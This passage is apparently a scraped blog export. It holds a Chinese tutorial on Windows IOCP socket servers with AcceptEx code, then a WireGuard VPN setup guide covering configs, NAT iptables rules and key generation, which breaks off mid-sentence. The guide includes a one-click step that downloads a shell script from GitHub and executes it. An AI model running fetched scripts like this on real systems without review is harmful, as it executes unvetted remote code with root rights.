这个socket的句柄直接使用强制转换就可以 __in_opt HANDLE ExistingCompletionPort, // 这个就是前面创建的那个完成端口句柄 __in ULONG_PTR CompletionKey, // 这个参数就非常的重要了这里就是两个结构 // 体之一，传递socket指针的一个结构体它会 // 把数据给到工作线程里面让我们可以对其进行 // 一些操作 __in DWORD NumberOfConcurrentThreads // 这里给0就可以了); 5、投递接收连接的请求，一旦有客户端连接之后工作线程会自己响应，这里第二个结构体就出来了。我们一步一步的来，首先说说两个结构体是什么东西。第一是套接字结构体，其实它仅仅是将套接字传入工作线程，也就是投递进去。申明也很简单仅仅只有一个SOCKET。 1234typedef struct _PER_SOCKET_CONTEXT&#123; SOCKET m_Socket;&#125; PER_SOCKET_CONTEXT, *PPER_SOCKET_CONTEXT; 第二个结构体就较为复杂一点，里面记录的是一些自定义数据和一个重叠量，第一个参数是必须要有的这个就是重叠量，它算是一个身份辨识，表面我是重叠结构体这个结构体指针的量会全部传进去。SOCKET是对应结束客户端连接时新建的套接字，WSABUH也是必须要有的东西，这个记录了这一次响应对应得到的数据。下面的char和int其实就是WSABUH里面的buffer和len，不同的指针指向同一个东西，这是可以自己自定义的，我这样写的原因是取值的时候方便一点，下面两个是我定义的int类型一个表示这一次响应对应的是接收消息还是接受连接。另一个是记录是哪一类套接字，比如说我有三种不同类型的客户端每一种对应操作不同我到时候就可以用这个来区分。 12345678910typedef struct _PER_IO_CONTEXT&#123; OVERLAPPED m_Overlapped; SOCKET m_sockAccept; WSABUF m_wsaBuf; char m_szBuffer[DATA_BUFSIZE]; int dataLength; OPERATION_TYPE m_OpType; CLIENT_IDENTITY m_Identity;&#125; PER_IO_CONTEXT, *PPER_IO_CONTEXT; 之后我们就开看怎么投递接受连接情况进入IOCP，首先就是AcceptEX()函数，这个东西性能比好，不阻塞线程但是用起来很麻烦，我也当时也认为很伤，很多开发者都不愿意使用这个高性能函数就是因为它很麻烦，但是一旦理解机制之后都很好办了。首先是使用WSAIoctl寻找AcceptEX()函数指针，为了性能才这样做的，然后构造一个PPER_IO_CONTEXT结构体指针这里要初始化并申请全局空间，进入IOCP之后仅仅会改变WSABUF值其他的我们现在怎么给之后在工作线程里面拿到的时候它就是什么值。GuidAcceptEx是一个GUID，m_lpfnAcceptEx是一个LPFN_ACCEPTEX，因为我使用的是类成员变量方便在线程里面二次投递。还有一点就是AcceptEX()函数性能高的原因在于在接收之前就已经准备好一个SOCKET，只要响应的之后把客户端对应连接的套接字值给他就可以了，等于说内存操作是提前完成的。 1234567891011121314151617181920212223242526GuidAcceptEx = WSAID_ACCEPTEX;DWORD dwBytes = 0;SOCKET Accept = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);if (SOCKET_ERROR == WSAIoctl(Accept, SIO_GET_EXTENSION_FUNCTION_POINTER, &amp;GuidAcceptEx, sizeof(GuidAcceptEx), &amp;m_lpfnAcceptEx, sizeof(m_lpfnAcceptEx), &amp;dwBytes, NULL, NULL))&#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;查找接受函数指针错误：&quot;) + E);&#125;PPER_IO_CONTEXT mainPerIoData = (PPER_IO_CONTEXT)GlobalAlloc(GPTR, sizeof(PER_IO_CONTEXT));mainPerIoData-&gt;m_sockAccept = Accept;mainPerIoData-&gt;dataLength = DATA_BUFSIZE;RtlZeroMemory(&amp;(mainPerIoData-&gt;m_Overlapped), sizeof(OVERLAPPED));mainPerIoData-&gt;m_OpType = ACCEPT;mainPerIoData-&gt;dataLength = DATA_BUFSIZE;mainPerIoData-&gt;m_wsaBuf.buf = mainPerIoData-&gt;m_szBuffer;mainPerIoData-&gt;m_wsaBuf.len = mainPerIoData-&gt;dataLength;if (FALSE == m_lpfnAcceptEx(mainPerHandleData-&gt;m_Socket, mainPerIoData-&gt;m_sockAccept, &amp;mainPerIoData-&gt;m_szBuffer, mainPerIoData-&gt;dataLength - ((sizeof(SOCKADDR_IN) + 16) * 2), sizeof(SOCKADDR_IN) + 16, sizeof(SOCKADDR_IN) + 16, &amp;dwBytes, &amp;(mainPerIoData-&gt;m_Overlapped)))&#123; if (WSAGetLastError() != WSA_IO_PENDING) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;投递接收请求错误：&quot;) + E); &#125;&#125; 6、接下来就是最激动人心的时候了，我们来解析工作线程到底干了什么我先把代码给贴出了，这个地方由于我是直接把我项目的代码复制过来了，同时也不能让你们看出来这个项目在干嘛我就会删除几段，但是不影响逻辑。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151DWORD thisBytesTransferred;PPER_SOCKET_CONTEXT thisPerHandleData;PPER_IO_CONTEXT thisPerIoData;DWORD thisRecvBytes;DWORD thisFlags;while (true)&#123; BOOL error; error = GetQueuedCompletionStatus(CompletionPort, &amp;thisBytesTransferred, (PULONG_PTR)&amp;thisPerHandleData, (LPOVERLAPPED *)&amp;thisPerIoData, INFINITE); if (thisBytesTransferred == 0) &#123; if (thisPerHandleData-&gt;m_Socket != ServerListen) &#123; //Function-&gt;WriteLog(_T(&quot;一个客户端连接关闭&quot;)); closesocket(thisPerHandleData-&gt;m_Socket); GlobalFree(thisPerHandleData); GlobalFree(thisPerIoData); continue; &#125; &#125; if (error != 0) &#123; if (thisPerIoData-&gt;m_OpType == ACCEPT) &#123; CString thismessgae(thisPerIoData-&gt;m_wsaBuf.buf); if (thismessgae != _T(&quot;tcp&quot;) &amp;&amp; thismessgae != _T(&quot;serialport&quot;) &amp;&amp; thismessgae != _T(&quot;shock&quot;)) &#123; char *ErrorMessage = &quot;ERROR:Illegally Accessed, Accessing Deny&quot;; send(thisPerIoData-&gt;m_sockAccept, ErrorMessage, strlen(ErrorMessage), 0); closesocket(thisPerIoData-&gt;m_sockAccept); DWORD Bytes = 0; SOCKET Accept = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); thisPerIoData-&gt;m_sockAccept = Accept; if (FALSE == m_lpfnAcceptEx(thisPerHandleData-&gt;m_Socket, thisPerIoData-&gt;m_sockAccept, &amp;thisPerIoData-&gt;m_szBuffer, thisPerIoData-&gt;dataLength - ((sizeof(SOCKADDR_IN) + 16) * 2), sizeof(SOCKADDR_IN) + 16, sizeof(SOCKADDR_IN) + 16, &amp;Bytes, &amp;(thisPerIoData-&gt;m_Overlapped))) &#123; if (WSAGetLastError() != WSA_IO_PENDING) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;投递接收请求错误：&quot;) + E); &#125; &#125; continue; &#125; DWORD dwBytes = 0; DWORD flage = 0; PPER_SOCKET_CONTEXT newPerHandleData = (PPER_SOCKET_CONTEXT)GlobalAlloc(GPTR, sizeof(PER_SOCKET_CONTEXT)); if (newPerHandleData == NULL) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;创建接受套接字IO数据失败，错误代码&quot;) + E); continue; &#125; PPER_IO_CONTEXT newPerIoData = (PPER_IO_CONTEXT)GlobalAlloc(GPTR, sizeof(PER_IO_CONTEXT)); if (newPerIoData == NULL) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;构建IO重叠结构体失败，错误代码：&quot;) + E); continue; &#125; if (thismessgae == &quot;tcp&quot;) &#123; newPerHandleData-&gt;m_Socket = thisPerIoData-&gt;m_sockAccept; RtlZeroMemory(&amp;(newPerIoData-&gt;m_Overlapped), sizeof(OVERLAPPED)); newPerIoData-&gt;m_OpType = RECIEVE; newPerIoData-&gt;dataLength = DATA_BUFSIZE; newPerIoData-&gt;m_Identity = TCP_CLIENT; newPerIoData-&gt;m_wsaBuf.buf = newPerIoData-&gt;m_szBuffer; newPerIoData-&gt;m_wsaBuf.len = newPerIoData-&gt;dataLength; &#125; if (CreateIoCompletionPort((HANDLE)thisPerIoData-&gt;m_sockAccept, CompletionPort, (DWORD)newPerHandleData, 0) == NULL) &#123; if (WSAGetLastError() != WSA_INVALID_HANDLE) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;接受套接字投递IO端口失败，错误代码：&quot;) + E); //continue; &#125; &#125; if (WSARecv(newPerHandleData-&gt;m_Socket, &amp;(newPerIoData-&gt;m_wsaBuf), 1, &amp;dwBytes, &amp;flage, &amp;(newPerIoData-&gt;m_Overlapped), NULL) == SOCKET_ERROR) &#123; if (WSAGetLastError() != ERROR_IO_PENDING &amp;&amp; WSAGetLastError() != WSAENOTCONN &amp;&amp; WSAGetLastError() != WSAECONNRESET &amp;&amp; WSAGetLastError() != WSAENOTSOCK) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;投递接受句柄失败，错误代码&quot;) + E); //continue; &#125; &#125; DWORD Bytes = 0; SOCKET Accept = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); thisPerIoData-&gt;m_sockAccept = Accept; thisPerHandleData-&gt;m_Socket = ServerListen; BOOL SUCCESS = m_lpfnAcceptEx(thisPerHandleData-&gt;m_Socket, thisPerIoData-&gt;m_sockAccept, &amp;thisPerIoData-&gt;m_szBuffer, thisPerIoData-&gt;dataLength - ((sizeof(SOCKADDR_IN) + 16) * 2), sizeof(SOCKADDR_IN) + 16, sizeof(SOCKADDR_IN) + 16, &amp;Bytes, &amp;(thisPerIoData-&gt;m_Overlapped)); if (FALSE == SUCCESS) &#123; if (WSAGetLastError() != WSA_IO_PENDING) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;严重错误，请重启程序，投递接收请求错误：&quot;) + E); &#125; &#125; continue; &#125; if (thisPerIoData-&gt;m_OpType == RECIEVE) &#123; DWORD flage = 0; DWORD dwBytes = 0; //这里删除了一大段，其实是对接收消息的处理。 if (WSARecv(thisPerHandleData-&gt;m_Socket, &amp;(thisPerIoData-&gt;m_wsaBuf), 1, &amp;dwBytes, &amp;flage, &amp;(thisPerIoData-&gt;m_Overlapped), NULL) == SOCKET_ERROR) &#123; if (WSAGetLastError() != ERROR_IO_PENDING) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;二次投递接受句柄失败&quot;) + E); continue; &#125; else &#123; continue; &#125; &#125; continue; &#125; else &#123; if (thisPerIoData-&gt;m_OpType == ACCEPT) &#123; if (thisPerHandleData-&gt;m_Socket == ServerListen) &#123; DWORD Bytes = 0; SOCKET Accept = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); thisPerIoData-&gt;m_sockAccept = Accept; if (FALSE == m_lpfnAcceptEx(thisPerHandleData-&gt;m_Socket, thisPerIoData-&gt;m_sockAccept, &amp;thisPerIoData-&gt;m_szBuffer, thisPerIoData-&gt;dataLength - ((sizeof(SOCKADDR_IN) + 16) * 2), sizeof(SOCKADDR_IN) + 16, sizeof(SOCKADDR_IN) + 16, &amp;Bytes, &amp;(thisPerIoData-&gt;m_Overlapped))) &#123; if (WSAGetLastError() != WSA_IO_PENDING) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;投递接收请求错误：&quot;) + E); &#125; &#125; &#125; &#125; &#125; &#125;&#125; 我们来详细讲一下这是在干嘛，首先是GetQueuedCompletionStatus()函数，这个就是让线程进入休眠的函数，一旦整个模型有动静它就会返回，我们可以看见PPER_SOCKET_CONTEXT和PPER_IO_CONTEXT结构体会被他返回回来，没错这就是之前我们传入的，整个流程仅仅是将接收的消息放到WSABUF里面，把接受的连接给到SOCKET里面，而PPER_SOCKET_CONTEXT就没有变化。具体的解析我们没有必要讲，需要将的是如果这一次响应是一个接受连接，那么我们会申请两个新结构体和对应的全局空间，然后就是老套路绑定到完成端口，然后投递接受消息请求给完成端口然后等待响应。注意我们接受一个连接之后对应必须重新投递一次接受请求给完成端口，这个时候我们不用申请新的空间，我们只需要给老结构体一个SOCKET给进去，毕竟之前那个已经有一个对应的连接了。如果是接收消息的话就是下面一个if的话就没有什么好说的，接收到之后二次投递请求就可以了，空间继续使用它的空间就好。其实我写的代码完全可以忽略大部分，只看看关键部分就可以了。无论GetQueuedCompletionStatus失败与否只要响应没有数据那要不然是客户端发了一个空，但是这个基本不可能，那只能是客户端对应的socket退出了或者关闭了，无论是程序崩溃还是怎么的，一旦客户端退出这边就会进入第一个if这个时候一定要释放空间。服务端程序一旦出现内存溢出是很要命的事情，我测试了整整两天确定没有溢出才敢往我们公司的git上提交。 ※注意 整个过程有几点需要注意一下第一是线程操作，仅仅是完成端口内部几个工作线程的通讯的话不需要做什么线程保护，但是一旦与其他线程有通讯一定不要忘记线程保护，而且我建议千万不要用互斥锁，因为互斥锁不会阻塞线程一旦资源被锁住函数会立即返回向下执行，这有可能会引起完成端口失效。我项目使用的是临界区来完成线程保护，经过测试没有什么大的问题。第二是内存释放的问题，每一次申请了内存之后一定要考虑这个申请会执行几次，什么时候释放，如上文所说一旦发生内存泄露那么往后debug是很困难的，同时这个服务端程序根本不能稳定使用。第三是问题规避，由于我们最终的程序是长时间运行的7×24这种，如果某一个函数返回错误，那么这个错误不能影响这个模型的运行，那么对应每一次都需要判断是否返回错误这个错误怎么化解才能不影响整个IOCP。第四，退出的时候不能直接停止线程释放内存因为线程是休眠的，常规方法是不能退出工作线程的，在退出的时候一定要优雅的来，具体方法大家去网上找找就知道了，这里不赘述。 ※总结 完成端口我仅仅开发两个项目的时候使用过，虽然会花费大量的时间，但是结果绝对是值得的，性能强，稳定性好并发连接根本就不虚。同时上千个连接来了IOCP都可以气定神闲的完成操作而且速度非常快，同时服务器也没有太大的压力。 还有就是这篇博文写的很干，原理没有讲到太多基本直接上代码了，希望大家不要直接就抄去用，首先需要把机制给彻底弄清楚，不然解析什么的都可能会出错。最后毕竟我还是比较菜的，写代码的风格也有一点野路子在里面，我写的博文如果有什么大问题希望各位高手指正，最好不要误人子弟。（我相信应该有小问题，没有大问题，哈哈哈） ※补全[22:1] ※问题描述 我们都知道socket编程之中对监听的socket有一个函数是accept，这个函数的作用是阻塞方式，当有链接来的时候便会返回。它的性能其实不高，原因在于当我们accept的时候对于客户端的连接回去创建一个新的socket，这个时候便会去申请内容完成构造。我们使用AcceptEX方式是预先创建完成一个socket当连接来的时候便将这个socket给客户端，所以他的性能很好。同时AcceptEX不会阻塞而是直接放回，所以需要将接受到的socket投递给完成端口好让完成端口进行响应。之前我写的创建方式是这样的代码： 1234567891011121314151617181920212223242526GuidAcceptEx = WSAID_ACCEPTEX;DWORD dwBytes = 0;SOCKET Accept = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);if (SOCKET_ERROR == WSAIoctl(Accept, SIO_GET_EXTENSION_FUNCTION_POINTER, &amp;GuidAcceptEx, sizeof(GuidAcceptEx), &amp;m_lpfnAcceptEx, sizeof(m_lpfnAcceptEx), &amp;dwBytes, NULL, NULL))&#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;查找接受函数指针错误：&quot;) + E);&#125;PPER_IO_CONTEXT mainPerIoData = (PPER_IO_CONTEXT)GlobalAlloc(GPTR, sizeof(PER_IO_CONTEXT));mainPerIoData-&gt;m_sockAccept = Accept;mainPerIoData-&gt;dataLength = DATA_BUFSIZE;RtlZeroMemory(&amp;(mainPerIoData-&gt;m_Overlapped), sizeof(OVERLAPPED));mainPerIoData-&gt;m_OpType = ACCEPT;mainPerIoData-&gt;dataLength = DATA_BUFSIZE;mainPerIoData-&gt;m_wsaBuf.buf = mainPerIoData-&gt;m_szBuffer;mainPerIoData-&gt;m_wsaBuf.len = mainPerIoData-&gt;dataLength;if (FALSE == m_lpfnAcceptEx(mainPerHandleData-&gt;m_Socket, mainPerIoData-&gt;m_sockAccept, &amp;mainPerIoData-&gt;m_szBuffer, mainPerIoData-&gt;dataLength - ((sizeof(SOCKADDR_IN) + 16) * 2), sizeof(SOCKADDR_IN) + 16, sizeof(SOCKADDR_IN) + 16, &amp;dwBytes, &amp;(mainPerIoData-&gt;m_Overlapped)))&#123; if (WSAGetLastError() != WSA_IO_PENDING) &#123; CString E; E.Format(_T(&quot;%d&quot;), WSAGetLastError()); Function-&gt;WriteLog(_T(&quot;投递接收请求错误：&quot;) + E); &#125;&#125; 大家可以看到m_lpfnAcceptEx是AcceptEX的函数指针，我们先来分析一下AcceptEX的参数到底是一些什么东西在将问题讲出来： 12345678910BOOL AcceptEx( __in SOCKET sListenSocket, __in SOCKET sAcceptSocket, __in PVOID lpOutputBuffer, __in DWORD dwReceiveDataLength, __in DWORD dwLocalAddressLength, __in DWORD dwRemoteAddressLength, __out LPDWORD lpdwBytesReceived, __in LPOVERLAPPED lpOverlapped); 第一个参数是监听的socket，第二是接受的socket这两个没有什么好说的，第三个参数连接数据的缓冲区包含服务器的本地地址，客户机的远程地址，以及在新建连接上发送的第一个数据块三种数据，第四个参数是接收数据的长度，也就是缓冲区的长度，这个就是一个问题了，接收数据长度如果设置的值大于零的话那么完成端口是不会响应连接的。意思是当一个连接上来之后没有发送数据那么不仅仅IOCP没有能力识别到这个事件同时这个连接会将接受给占用，直到它发送第一条数据，如果将这个值设置为0则IOCP会立刻响应新连接，这就是问题。后面几个参数上一篇文件有我也就不多说了。 简单来讲问题就是：当客户端建立了连接但是没有向服务端发送任何数据的时候会将我们准备的accept给占用了，这时新的连接来了之后就没有东西来接它了。虽然在队里里面等待这但是没有入口IOCP也不会响应。 ※解决方案 经过上面的分析解决方案有两个，第一是改变AcceptEX的缓冲区大小使完成端口立刻响应连接并进入处理。问题是我现在写好的程序解析与管理部分都已经经过多重测试，如果这样修改的话后续的结构基本上都会发送变动。第二是找一个办法能够监测accept的连接时长如果当时间超过一个具体的值之后把它干掉重新投递就可以解决了。我使用的就是这种方式，简单来说就是创建一个新的线程进行监管超时之后处理一下就行了。这里便需要使用一个NB的函数getsockopt： 12345678#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;int getsockopt(int sockfd, int level, int optname, void *optval, socklen_t*optlen);//sockfd：一个标识套接口的描述字。//level：选项定义的层次。例如，支持的层次有SOL_SOCKET、IPPROTO_TCP。//optname：需获取的套接口选项。//optval：指针，指向存放所获得选项值的缓冲区。//optlen：指针，指向optval缓冲区的长度值。 这些参数里面最重要的就是套接字的选项，这个参数指明你需要获取socket的什么东西。在众多的选项之中有一个就是SO_CONNECT_TIME，他表示的是socket的连接时间，如果没有连接的话optval将等于-1，如果已经连接的话这个值便是连接的时间单位为秒。所以我的处理方案便是： 1234567891011121314void IO_CompletionPort::CheckAccept() &#123; while (true) &#123; Sleep(1000); int iSecs; int iBytes = sizeof(int); EnterCriticalSection(&amp;CheckCS);//TODO进入临界区 getsockopt(Accept, SOL_SOCKET, SO_CONNECT_TIME, (char *)&amp;iSecs, &amp;iBytes); LeaveCriticalSection(&amp;CheckCS);//TODO离开临界区 if (iSecs &gt; 10) &#123;//大于10S后断开 closesocket(Accept); &#125; &#125;&#125; 这里的临界区是为了保证多线程情况下函数操作的线程安全，但是理论上来讲socket就是线程安全，我这样写无非就是为了以防万一。当closesocket执行的时候完成端口可以捕捉到对应的响应然后处理一下重新投递就可以了。其中的Accept对象就是创建的待接收socket，这个东西我是放在全局更新的，虽然这样做基本上毁了AcceptEX的高性能，但是无所谓了。 ※RIO Code that explores the Windows Registered I/O Networking Extensions ※IOCPServer A IOCP Server Class on Windows! 本类配套文章：http://www.cnblogs.com/tanguoying/p/8439701.html 一个基于完成端口网络服务类，自带缓存池和心跳包监测！ 这个类IOCP是本代码的核心类，用于说明WinSock服务器端编程模型中的完成端口(IOCP)的使用方法 其中的IOContext类是封装了用于每一个重叠操作的参数 具体说明了服务器端建立完成端口、建立工作者线程、投递Recv请求、投递Accept请求的方法，所有的客户端连入的Socket都需要绑定到IOCP上，所有从客户端发来的数据，都会调用回调函数。 用法：派生一个子类，重载回调函数 https://blog.csdn.net/Summer_night_star/article/details/120803104 ↩︎ https://blog.csdn.net/Summer_night_star/article/details/122420277 ↩︎ https://www.cnblogs.com/xiaobingqianrui/p/9258665.html ↩︎ https://juejin.cn/post/7203931072262193211 ↩︎ https://developer.aliyun.com/article/708589 ↩︎ https://developer.aliyun.com/article/644383 ↩︎ https://www.cnblogs.com/yuanchenhui/p/iocp_windows.html ↩︎ https://www.cnblogs.com/yuanchenhui/p/icop_accept.html ↩︎ https://cloud.baidu.com/article/2981681 ↩︎ https://blog.csdn.net/neicole/article/details/7549497 ↩︎ https://www.cnblogs.com/onlytiancai/archive/2009/04/06/1430256.html ↩︎ http://www.cppblog.com/johndragon/archive/2008/09/16/21845.html ↩︎ http://www.cppblog.com/niewenlong/archive/2007/08/17/30224.html ↩︎ https://blog.csdn.net/leamus/article/details/103835822 ↩︎ https://blog.csdn.net/leamus/article/details/108915983 ↩︎ https://blog.csdn.net/leamus/article/details/109045118 ↩︎ https://blog.csdn.net/leamus/article/details/109047927 ↩︎ https://blog.csdn.net/leamus/article/details/109047982 ↩︎ https://blog.csdn.net/PiggyXP/article/details/6922277 ↩︎ https://www.cnblogs.com/tanguoying/p/8439701.html ↩︎ https://www.tangyuecan.com/2018/02/09/mfc高性能网络编程：完成端口/ ↩︎ https://www.tangyuecan.com/2019/07/13/完成端口补全/ ↩︎ ↩︎","tags":"iocp"},{"title":"WireGuard学习","url":"/20240530/wireguard-xue-xi/","text":"WireGuard WireGuard 的安装条件非常苛刻，对内核版本要求极高，不仅如此，在不同的系统中，内核，内核源码包，内核头文件必须存在且这三者版本要一致，Red Hat、CentOS、Fedora 等系统的内核，内核源码包，内核头文件包名分别为 kernel、kernel-devel、kernel-headers；Debian、Ubuntu 等系统的内核，内核源码包，内核头文件包名分别为 kernel、linux-headers。果这三者任一条件不满足的话，则不管是从代码编译安装还是从 repository 直接安装，也只是安装了 wireguard-tools 而已。而 WireGuard 真正工作的部分，是 wireguard-dkms，也就是动态内核模块支持(DKMS)，是它将 WireGuard 编译到系统内核中。 目前 WireGuard 已经被合并到 Linux 5.6 内核中了，如果你的内核版本 &gt;= 5.6，就可以用上原生的 WireGuard 了，只需要安装 wireguard-tools 即可，内核版本&lt;5.6，可能需要首先更新内核，否则可能会报错：Unable to access interface: Protocol not supported WireGuard 优点： 配置精简，可直接使用默认值 只需最少的密钥管理工作，每个主机只需要 1 个公钥和 1 个私钥。 就像普通的以太网接口一样，以 Linux 内核模块的形式运行，资源占用小。 能够将部分流量或所有流量通过 VPN 传送到局域网内的任意主机。 能够在网络故障恢复之后自动重连，戳到了其他 VPN 的痛处。 比目前主流的 VPN 协议，连接速度要更快，延迟更低。 使用了更先进的加密技术，具有前向加密和抗降级攻击的能力。 支持任何类型的二层网络通信，例如 ARP、DHCP 和 ICMP，而不仅仅是 TCP/HTTP。 可以运行在主机中为容器之间提供通信，也可以运行在容器中为主机之间提供通信。 WireGuard 不能做的事： 类似 gossip 协议实现网络自愈。 通过信令服务器突破双重 NAT。 通过中央服务器自动分配和撤销密钥。 发送原始的二层以太网帧。 当然，你可以使用 WireGuard 作为底层协议来实现自己想要的功能，从而弥补上述这些缺憾。 注意： 关于深度包检测：WireGuard并不关注混淆问题。相反，混淆应该发生在WireGuard之上的一层，WireGuard专注于以简单的实现方式提供坚实的加密技术，可以在上层进行混淆操作。 UDP协议：WireGuard默认使用UDP协议，由于TCP-over-TCP隧道的网络性能非常糟糕，WireGuard明确地不支持TCP隧道。相反，将WireGuard的UDP数据包转化为TCP是上层混淆的工作，可以由udptunnel和udp2raw等项目完成。 A 设备与 B 设备互相需要保证虚拟网卡的 IP 在相同网络位的地址段中，并且这个地址段被 WireGuard 的配置文件 AllowedIPs 所允许通过 如果你试图从 A 设备下属子网访问 B 设备的对端子网，你需要在 A 设备上配置系统路由，将系统三层网络的路由目的地指向对端虚拟 IP 地址，出接口为虚拟网卡，并且这个地址段必须被对方 WireGuard 的配置文件 AllowedIPs 所允许通过（当然你也可以使用 SNAT 进行地址伪装，通常来说防火墙配置 masquerade 即可，还需要 ip_forward） 最后，在 WireGuard 中的所有数据报文，都采用 UDP 的方式发送。 （个人观感：OSPF Area = WG Config | OSPF Peer = WG Peer | OSPF route = WG AllowedIPs） 被Linux创始人称做艺术品的组网神器——WireGuard 通过WireGuard搭建隧道实现内网穿透 官方安装手册 docker安装 Wireguard配置文件详解 使用 WireGuard 搭建 VPN 访问家庭内网 How to setup a VPN server using WireGuard (with NAT and IPv6) 通过WireGuard搭建隧道实现内网穿透 WireGuard 教程：WireGuard 的搭建使用与配置详解 WireGuard 搭建方法与使用教程 一键安装：WireGuard VPN installer for Linux servers： 12345678910# 一键安装curl -O https://raw.githubusercontent.com/angristan/wireguard-install/master/wireguard-install.shchmod +x wireguard-install.sh./wireguard-install.shsystemctl start wg-quick@wg0systemctl enable wg-quick@wg0wg show Configuring the WireGuard interface on the server The configuration of WireGuard lives in /etc/wireguard. We’ll call our interface wg0, so the config file will be /etc/wireguard/wg0.conf [Interface] Address = 10.66.66.1/24,fd42:42:42::1/64 ListenPort = 1194 PrivateKey = wg-quick up wg0 wg-quick down wg0 systemctl start wg-quick@wg0 systemctl enable wg-quick@wg0 systemctl status wg-quick@wg0 You can see the interface status and the public key with wg show or wg wg show Configuring the WireGuard interface on the client Generate a private with wg genkey, and assign addresses Put this in /etc/wireguard/wg0.conf, and start the interface [Interface] PrivateKey = Address = 10.66.66.2/24,fd42:42:42::2/64 wg-quick up wg0 Configuring peers Now that our interfaces are up, let’s configure the peers. It will allow us to make our server and our client communicate. On the client, add this : [Peer] PublicKey = Endpoint = :1194 AllowedIPs = 10.66.66.1/32,fd42:42:42::1/128 all the packets destined to AllowedIPs will be encrypted with PublicKey and sent to Endpoint. On the server, it’s basically the same, with the client private IP and without the endpoint: [Peer] PublicKey = AllowedIPs = 10.66.66.2/32,fd42:42:42::2/128 But WireGuard supports roaming on both ends, and that’s what allows us to have peers on the server without endpoints. As long as the peers (the clients) have the initial endpoint of the server, the server will know where so send the packets back, because the client’s endpoints will be built dynamically. The endpoint is the client’s public IP address (the router’s, if it is behing NAT), and, as we did not set a port nor an endpoint, a random port. Forward the traffic of the client trough the server Enable routing on the server First we need to enable IPv4 and IPv6 routing on the server, so that it can forward packets.在中继服务器上开启 IP 地址转发： $ echo “net.ipv4.ip_forward = 1” &gt;&gt; /etc/sysctl.conf $ echo “net.ipv4.conf.all.proxy_arp = 1” &gt;&gt; /etc/sysctl.conf $ sysctl -p /etc/sysctl.conf Enable NAT on the server We want to enable NAT between the server’s public interface (ens3 for me) and the wg0 interface.For that, we need two iptables commands: iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE ip6tables -t nat -A POSTROUTING -o ens3 -j MASQUERADE 添加 iptables 规则，允许本机的 NAT 转换 $ iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT $ iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT $ iptables -A FORWARD -i wg0 -o wg0 -m conntrack --ctstate NEW -j ACCEPT $ iptables -t nat -A POSTROUTING -s 192.0.2.0/24 -o eth0 -j MASQUERADE The good news is that WireGuard can execute these for us, when the interface is brought up. To keep things clean, we want to remove them when the interface is brought down, so here is what you need to add to your [Interface] block on the server: PostUp = iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE; ip6tables -t nat -A POSTROUTING -o ens3 -j MASQUERADE PostDown = iptables -t nat -D POSTROUTING -o ens3 -j MASQUERADE; ip6tables -t nat -D POSTROUTING -o ens3 -j MASQUERADE Make the server the client’s gateway We can leverage the AllowedIPs option to override the default route on the client.Simply change the line to: AllowedIPs = 0.0.0.0/0,::/0 Restart the interface. Done, all of your client’s packets are going trough the server! Adding more clients Adding more client is a bliss.The third peer’s configuration file will look like this: [Interface] PrivateKey = &lt;client 2 private key&gt; Address = 10.66.66.3/24,fd42:42:42::3/64 [Peer] PublicKey = Endpoint = :1194 AllowedIPs = 0.0.0.0/0,::/0 On the server: [Peer] PublicKey = &lt;client 2 public key&gt; AllowedIPs = 10.66.66.3/32,fd42:42:42::3/128 Note that the clients won’t have the other clients as peer since they don’t have valid initial endpoints (= a public IP address and open/forwarded port). Verifying your connection I usually use ipv6-test.com or ipleak.net to verify that my traffic is going trough the VPN, including IPv6. Generate a public key from a private key If you need to get the public key from a private key, you can pipe the private key to wg pubkey like: wg genkey | wg pubkey To get a pair in two files : wg genkey | tee privatekey | wg pubkey &gt; publickey Or in your terminal output: private_key=$(wg genkey) public_key=$(echo $private_key | wg pubkey) echo “private key: $private_key” echo “public key: $public_key” IPv4, IP6, dual stack…? Here, we use a dual stack VPN, and the peers connect via IPv4.I prefer the endpoints to be IPv4 since sometimes I am on IPv4-only network but you could connect to your server via IPv6.The privates addresses could also be IPv4 only or IPv6 only, but dual stack is the best! Changing the client’s DNS resolvers A little tip if you wan to change your client’s DNS resolvers upon connection. There are many reason to do this: With the new routes, your local network won’t be accessible. So if the DNS servers pushed by your DHCP server are in the local network, you’re screwed. (Or you add the correct route with PostUp on the client) You want to use a private/self-hosted DNS server, like Pi-hole You want to use a specific DNS server on a platform where you can’t without a VPN, like Android As for me, I currently put Adguard DNS everywhere. It’s especially useful on my Android phone where I 